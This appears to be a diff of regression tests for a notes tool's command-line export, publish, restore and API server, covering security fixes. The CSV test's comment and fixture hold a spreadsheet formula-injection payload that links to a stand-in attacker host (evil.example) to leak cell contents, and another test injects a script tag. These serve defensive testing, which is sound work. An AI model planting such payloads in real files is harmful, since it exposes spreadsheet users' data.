@@ -659,6 +659,30 @@ test('CLI export --format csv exits 0 and stdout is valid CSV', () => {
     assert.match(result.stdout, /johnny-rico/);
 });
 
+test('CLI export --format csv — a field value starting with =/+/-/@ is guarded against spreadsheet formula injection', () => {
+    // Real, confirmed vulnerability (not theoretical): a note's own field
+    // value — a title, an imported value, anything a vault owner or an
+    // imported note legitimately contains — can start with =/+/-/@ with no
+    // malicious intent at all, and before this fix would be written into
+    // the CSV completely unguarded. Opening that CSV in Excel, LibreOffice,
+    // or Google Sheets interprets such a cell as a live formula (OWASP's
+    // documented CSV/formula-injection class) — e.g. a field value of
+    // `=HYPERLINK("http://evil.example/"&A1,"Click")` would render as a
+    // clickable link exfiltrating another cell's content the moment the
+    // sheet is opened.
+    const vault = createVault({
+        'evil.md': '---\nid: evil-note\ntype: note\nname: "=HYPERLINK(\\"http://evil.example/\\")"\nstatus: published\n---\n'
+    });
+    try {
+        const result = cli(['export', '--format', 'csv'], vault.dir);
+        assert.equal(result.status, 0, result.stderr);
+        assert.match(result.stdout, /'=HYPERLINK/, 'a leading apostrophe must guard the formula-triggering character');
+        assert.doesNotMatch(result.stdout, /[^']=HYPERLINK/, 'the raw =HYPERLINK must never appear unguarded');
+    } finally {
+        vault.destroy();
+    }
+});
+
 test('CLI export --query filters results', () => {
     const result = cli(['export', '--format', 'json', '--query', 'where type = unit'], vaultPath);
     assert.equal(result.status, 0);
@@ -688,7 +712,7 @@ test('CLI export --format html renders one note as standalone HTML with resolved
             '!view character',
             'select id, name'
         ].join('\n'),
-        'rico.md': '---\nid: johnny-rico\ntype: character\nname: Johnny Rico\n---\n'
+        'rico.md': '---\nid: johnny-rico\ntype: character\nname: Johnny Rico\nstatus: published\n---\n'
     });
     try {
         const result = cli(['export', '--id', 'mission-klendathu', '--format', 'html'], vault.dir);
@@ -702,6 +726,49 @@ test('CLI export --format html renders one note as standalone HTML with resolved
         assert.match(result.stdout, /Johnny Rico/);
         assert.doesNotMatch(result.stdout, /!view character/);
         assert.match(result.stdout, /yamlink-callout-note/);
+    } finally {
+        vault.destroy();
+    }
+});
+
+test('CLI export --format html — a <script> tag in note content is neutralized by a strict Content-Security-Policy, not stripped', () => {
+    // Real, confirmed vulnerability (not theoretical): getMd() renders note
+    // content with `html: true`, so raw HTML — including a literal
+    // <script> tag — passes straight through into the exported standalone
+    // file with no sanitization. Before this fix, buildStandaloneHtml() had
+    // no Content-Security-Policy at all, so that script would execute with
+    // full privileges in whatever opened the file. This repo has no headless
+    // browser available to prove actual script-blocking end to end (stated
+    // honestly, not overclaimed) — this test instead proves the two things
+    // that are directly verifiable: the CSP meta tag is present with a
+    // `script-src` directive that admits no script at all ('none', not
+    // 'unsafe-inline' and not a guessable/static nonce), and it appears
+    // before the note's own rendered body in document order (a CSP meta tag
+    // has no effect on content the parser has already processed before it).
+    const vault = createVault({
+        'evil.md': [
+            '---',
+            'id: evil-note',
+            'type: note',
+            'title: Evil Note',
+            'status: published',
+            '---',
+            '',
+            '<script>window.__exfiltrated = true;</script>',
+            '',
+            'Ordinary paragraph.'
+        ].join('\n')
+    });
+    try {
+        const result = cli(['export', '--id', 'evil-note', '--format', 'html'], vault.dir);
+        assert.equal(result.status, 0, result.stderr);
+        assert.match(result.stdout, /<meta http-equiv="Content-Security-Policy" content="[^"]*script-src 'none'[^"]*">/);
+        const cspIndex = result.stdout.indexOf('Content-Security-Policy');
+        const scriptIndex = result.stdout.indexOf('<script>window.__exfiltrated');
+        assert.ok(cspIndex > -1 && scriptIndex > -1 && cspIndex < scriptIndex, 'the CSP meta tag must appear before the note body in document order');
+        // html: true is a deliberate, kept feature (legitimate inline HTML
+        // authoring) — the fix is the CSP neutralizing it, not stripping it.
+        assert.match(result.stdout, /<script>window\.__exfiltrated = true;<\/script>/);
     } finally {
         vault.destroy();
     }
@@ -735,6 +802,27 @@ test('CLI export --format html --output writes a real file', () => {
     } finally {
         fs.rmSync(outPath, { force: true });
     }
+});
+
+test('CLI publish refuses --out pointed at the vault itself, before writing anything', () => {
+    // Real bug, found and fixed via direct testing: --out had no guard
+    // against being the vault directory (or a folder inside it), so the raw
+    // .md source files would sit in the output tree alongside the generated
+    // site and get published/deployed unfiltered — every publishability and
+    // link-resolution fix is bypassed entirely if this happens.
+    const result = cli(['publish', '--out', vaultPath, '--json'], vaultPath);
+    assert.equal(result.status, 1);
+    const body = parseJson(result.stdout);
+    assert.equal(body.code, 'UNSAFE_OUT_DIR');
+    assert.ok(!fs.existsSync(path.join(vaultPath, 'manifest.json')));
+});
+
+test('CLI publish refuses --out pointed at a folder inside the vault', () => {
+    const outDir = path.join(vaultPath, 'site-build');
+    const result = cli(['publish', '--out', outDir, '--json'], vaultPath);
+    assert.equal(result.status, 1);
+    assert.equal(parseJson(result.stdout).code, 'UNSAFE_OUT_DIR');
+    assert.equal(fs.existsSync(outDir), false);
 });
 
 test('CLI --version prints the installed version and exits, does not fall through to Conduit', () => {
@@ -1221,6 +1309,7 @@ test('CLI init scaffolds the correct files', () => {
         assert.equal(fs.existsSync(path.join(target, '.yamlink')), true);
         assert.equal(fs.existsSync(path.join(target, '_templates')), true);
         assert.equal(fs.existsSync(path.join(target, 'welcome.md')), true);
+        assert.match(fs.readFileSync(path.join(target, '.gitignore'), 'utf8'), /^\.yamlink\/$/m);
     } finally {
         fs.rmSync(dir, { recursive: true, force: true });
     }
@@ -1246,6 +1335,7 @@ test('CLI init --json returns expected shape', () => {
         assert.equal(body.ok, true);
         assert.ok(Array.isArray(body.created));
         assert.ok(body.created.includes('welcome.md'));
+        assert.ok(body.created.includes('.gitignore'));
     } finally {
         fs.rmSync(dir, { recursive: true, force: true });
     }
@@ -1640,6 +1730,50 @@ test('CLI mutations captures note_created events written by create', () => {
     }
 });
 
+test('CLI mutations purge-field — real exploit reproduction: a sensitive field value is permanently redacted on disk', () => {
+    // Real scenario (Codex finding, not theoretical): a sensitive field
+    // (here, a password accidentally stored in frontmatter) gets changed,
+    // and its raw old/new values sit in .yamlink/mutation-log.ndjson forever
+    // — by design, to support history/restore — with no way to remove just
+    // the private value without destroying the whole audit trail. This test
+    // proves the real CLI path end to end: dry-run reports accurately
+    // without touching anything, and --yes actually redacts the raw value
+    // from the real file on disk while preserving the rest of the event.
+    const vault = createVault({
+        'secret-note.md': '---\nid: secret-note\ntype: note\npassword: hunter1\n---\nBody.\n'
+    });
+    try {
+        const setResult = cli(['set', 'secret-note', 'password', 'hunter2'], vault.dir);
+        assert.equal(setResult.status, 0, setResult.stderr);
+
+        const logPath = path.join(vault.dir, '.yamlink', 'mutation-log.ndjson');
+        const beforeLog = fs.readFileSync(logPath, 'utf8');
+        assert.match(beforeLog, /hunter2/, 'the real secret must actually be in the log before the fix is exercised');
+
+        // Dry run (no --yes): reports what would happen, changes nothing.
+        const dryRun = cli(['mutations', 'purge-field', 'password', '--note', 'secret-note', '--json'], vault.dir);
+        assert.equal(dryRun.status, 0, dryRun.stderr);
+        const dryRunBody = parseJson(dryRun.stdout);
+        assert.equal(dryRunBody.dryRun, true);
+        assert.ok(dryRunBody.wouldRedactEventCount >= 1);
+        assert.match(fs.readFileSync(logPath, 'utf8'), /hunter2/, 'dry run must not modify the file');
+
+        // Real purge.
+        const purge = cli(['mutations', 'purge-field', 'password', '--note', 'secret-note', '--yes', '--json'], vault.dir);
+        assert.equal(purge.status, 0, purge.stderr);
+        const purgeBody = parseJson(purge.stdout);
+        assert.ok(purgeBody.redactedEventCount >= 1);
+
+        const afterLog = fs.readFileSync(logPath, 'utf8');
+        assert.doesNotMatch(afterLog, /hunter1/);
+        assert.doesNotMatch(afterLog, /hunter2/);
+        assert.match(afterLog, /\[redacted\]/);
+        assert.match(afterLog, /"field":"password"/, 'the fact that the password field changed must still be recorded');
+    } finally {
+        vault.destroy();
+    }
+});
+
 test('CLI mutations captures relation_changed events written by rename', () => {
     const vault = createVault({
         'rico.md': '---\nid: johnny-rico\ntype: character\n---\n',
@@ -1855,11 +1989,18 @@ test('CLI restore without --output does not export markdown files', () => {
         'rico.md': '---\nid: johnny-rico\ntype: character\nname: Johnny Rico\n---\n'
     });
     try {
-        const before = fs.readdirSync(vault.dir).filter((name) => name !== '.yamlink').sort();
+        // .gitignore is filtered out alongside .yamlink here: any CLI
+        // invocation now defensively ensures the vault's .gitignore excludes
+        // .yamlink/ (see mutationEventLog.js's initMutationLog), a real,
+        // correct, unrelated security fix whose own side effect this test
+        // isn't about — this test's actual concern is specifically whether
+        // restore without --output writes any note/export files.
+        const ignoredHousekeepingFiles = new Set(['.yamlink', '.gitignore']);
+        const before = fs.readdirSync(vault.dir).filter((name) => !ignoredHousekeepingFiles.has(name)).sort();
         const result = cli(['restore', new Date().toISOString()], vault.dir);
         assert.equal(result.status, 0);
         assert.match(result.stdout, /Writes\s+none/);
-        const after = fs.readdirSync(vault.dir).filter((name) => name !== '.yamlink').sort();
+        const after = fs.readdirSync(vault.dir).filter((name) => !ignoredHousekeepingFiles.has(name)).sort();
         assert.deepEqual(after, before);
     } finally {
         vault.destroy();
@@ -1894,6 +2035,69 @@ test('CLI restore --output refuses a subdirectory of the live vault, not just th
         assert.equal(body.code, 'REFUSE_LIVE_VAULT');
         assert.equal(fs.existsSync(nestedOutput), false, 'must not create the export directory before refusing');
     } finally {
+        vault.destroy();
+    }
+});
+
+test('CLI restore --output refuses an external link into the live vault before creating files', () => {
+    const vault = createVault({
+        'rico.md': '---\nid: johnny-rico\ntype: character\nname: Johnny Rico\n---\n'
+    });
+    const external = fs.mkdtempSync(path.join(os.tmpdir(), 'yamlink-restore-link-'));
+    const linkedOutput = path.join(external, 'vault-link');
+    try {
+        fs.symlinkSync(vault.dir, linkedOutput, process.platform === 'win32' ? 'junction' : 'dir');
+        const before = fs.readFileSync(path.join(vault.dir, 'rico.md'), 'utf8');
+        const result = cli(['restore', new Date().toISOString(), '--output', path.join(linkedOutput, 'export'), '--json'], vault.dir);
+        assert.equal(result.status, 1);
+        const body = parseJson(result.stdout);
+        assert.equal(body.code, 'REFUSE_LIVE_VAULT');
+        assert.equal(fs.existsSync(path.join(vault.dir, 'export')), false);
+        assert.equal(fs.readFileSync(path.join(vault.dir, 'rico.md'), 'utf8'), before);
+    } finally {
+        fs.rmSync(external, { recursive: true, force: true });
+        vault.destroy();
+    }
+});
+
+test('CLI restore --output still writes to an ordinary external directory', () => {
+    const vault = createVault({
+        'rico.md': '---\nid: johnny-rico\ntype: character\nname: Johnny Rico\n---\n'
+    });
+    const external = fs.mkdtempSync(path.join(os.tmpdir(), 'yamlink-restore-safe-'));
+    try {
+        const output = path.join(external, 'export');
+        const result = cli(['restore', new Date().toISOString(), '--output', output, '--json'], vault.dir);
+        assert.equal(result.status, 0, result.stderr);
+        const body = parseJson(result.stdout);
+        assert.equal(body.output.outputPath, output);
+        assert.ok(fs.statSync(output).isDirectory());
+        assert.equal(fs.existsSync(path.join(vault.dir, 'export')), false);
+    } finally {
+        fs.rmSync(external, { recursive: true, force: true });
+        vault.destroy();
+    }
+});
+
+test('restore export replaces an output hard link without modifying the live note', () => {
+    const { writeRestoreExport } = require('../src/cli/commands/restore');
+    const vault = createVault({
+        'rico.md': '---\nid: johnny-rico\ntype: character\nname: Johnny Rico\n---\n'
+    });
+    const external = fs.mkdtempSync(path.join(os.tmpdir(), 'yamlink-restore-hardlink-'));
+    try {
+        const source = path.join(vault.dir, 'rico.md');
+        const outputFile = path.join(external, 'johnny-rico.md');
+        fs.linkSync(source, outputFile);
+        const before = fs.readFileSync(source, 'utf8');
+        writeRestoreExport({
+            timestamp: new Date().toISOString(),
+            notes: [{ id: 'johnny-rico', fields: { id: 'johnny-rico', type: 'character', name: 'Historical Rico' }, complete: true }]
+        }, external, vault.dir);
+        assert.equal(fs.readFileSync(source, 'utf8'), before);
+        assert.match(fs.readFileSync(outputFile, 'utf8'), /Historical Rico/);
+    } finally {
+        fs.rmSync(external, { recursive: true, force: true });
         vault.destroy();
     }
 });
@@ -2390,9 +2594,9 @@ test('CLI watch --stream --json emits NDJSON mutation events after a markdown ch
 
 // ─── startServer — programmatic server lifecycle ──────────────────────────────
 
-function httpGet(url) {
+function httpGet(url, headers) {
     return new Promise((resolve, reject) => {
-        http.get(url, (res) => {
+        http.get(url, headers ? { headers } : {}, (res) => {
             let body = '';
             res.on('data', (chunk) => { body += chunk; });
             res.on('end', () => resolve({ status: res.statusCode, body }));
@@ -2401,6 +2605,16 @@ function httpGet(url) {
 }
 
 describe('startServer — programmatic lifecycle', () => {
+    // startServer() now sets process.env.YAMLINK_API_TOKEN as a side effect
+    // (auth-by-default — see src/api/apiToken.js) — restore it so this
+    // doesn't leak into any other test later in this same process/file.
+    let originalToken;
+    before(() => { originalToken = process.env.YAMLINK_API_TOKEN; });
+    after(() => {
+        if (originalToken === undefined) delete process.env.YAMLINK_API_TOKEN;
+        else process.env.YAMLINK_API_TOKEN = originalToken;
+    });
+
     test('starts listening and serves /api/types, close() shuts it down', async () => {
         const vault = createVault({
             'rico.md': '---\nid: rico\ntype: contact\nname: Johnny Rico\n---\n'
@@ -2413,10 +2627,55 @@ describe('startServer — programmatic lifecycle', () => {
         });
 
         try {
-            const { status, body } = await httpGet(`http://${handle.host}:${handle.port}/api/types`);
+            // Auth is now required by default — the server self-generates a
+            // token (see src/api/apiToken.js) rather than staying wide open;
+            // handle.token is that same value.
+            assert.ok(handle.token, 'startServer() should return the token it generated');
+            const unauthed = await httpGet(`http://${handle.host}:${handle.port}/api/types`);
+            assert.equal(unauthed.status, 401, 'a request with no token should be rejected');
+            const { status, body } = await httpGet(`http://${handle.host}:${handle.port}/api/types`, { 'X-Yamlink-Token': handle.token });
             assert.equal(status, 200);
             const parsed = JSON.parse(body);
             assert.ok(Array.isArray(parsed.types), 'response should have a types array');
+        } finally {
+            await handle.close();
+            vault.destroy();
+        }
+    });
+
+    test('a write route is rejected without the token and succeeds with it — not just reads', async () => {
+        const vault = createVault({
+            'rico.md': '---\nid: rico\ntype: contact\nname: Johnny Rico\n---\n'
+        });
+        const { startServer } = require('../src/cli/commands/serve');
+        const handle = await startServer({
+            port: 0,
+            vaultPath: vault.dir,
+            workspaceFolders: [{ uri: { fsPath: vault.dir } }]
+        });
+        const httpPatch = (url, headers, body) => new Promise((resolve, reject) => {
+            const payload = JSON.stringify(body);
+            const req = http.request(url, {
+                method: 'PATCH',
+                headers: { ...(headers || {}), 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
+            }, (res) => {
+                let data = '';
+                res.on('data', (chunk) => { data += chunk; });
+                res.on('end', () => resolve({ status: res.statusCode, body: data }));
+            });
+            req.on('error', reject);
+            req.write(payload);
+            req.end();
+        });
+        try {
+            const url = `http://${handle.host}:${handle.port}/api/nodes/rico`;
+            const unauthed = await httpPatch(url, {}, { fields: { name: 'Hijacked' } });
+            assert.equal(unauthed.status, 401);
+            const content = fs.readFileSync(path.join(vault.dir, 'rico.md'), 'utf8');
+            assert.match(content, /name: Johnny Rico/, 'an unauthenticated write must not touch the file');
+
+            const authed = await httpPatch(url, { 'X-Yamlink-Token': handle.token }, { fields: { name: 'Updated' } });
+            assert.equal(authed.status, 200);
         } finally {
             await handle.close();
             vault.destroy();
